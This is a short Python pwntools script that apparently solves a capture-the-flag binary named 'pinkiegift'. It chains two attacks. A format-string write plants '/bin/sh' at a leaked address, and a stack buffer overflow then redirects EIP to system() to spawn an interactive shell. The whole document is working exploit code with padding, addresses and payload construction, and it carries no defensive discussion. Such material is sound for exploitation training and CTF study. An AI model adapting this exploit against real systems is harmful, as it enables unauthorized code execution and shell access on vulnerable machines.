import struct
from pwn import *
from libformatstr import *

p = process("./pinkiegift")
gift = p.recv().split()

# stage 1: Format String - change value of binsh variable into "/bin/sh"
binsh_addr = int(gift[6], 16)
system_addr = int(gift[7], 16)

fmt = FormatStr()
fmt[binsh_addr] = "/bin/sh"

stage1 = fmt.payload(1,0)
p.sendline(stage1)
p.recv()

# stage 2: Buffer Overflow - change EIP after gets into "system" address with "binsh" address as argument
padding = 'A'*132
ebp = 'BBBB'
eip = p32(system_addr)
ret_after_eip = 'CCCC'
argv = p32(binsh_addr)

stage2 = padding + ebp + eip + ret_after_eip + argv
p.sendline(stage2)
p.recv()
p.interactive()
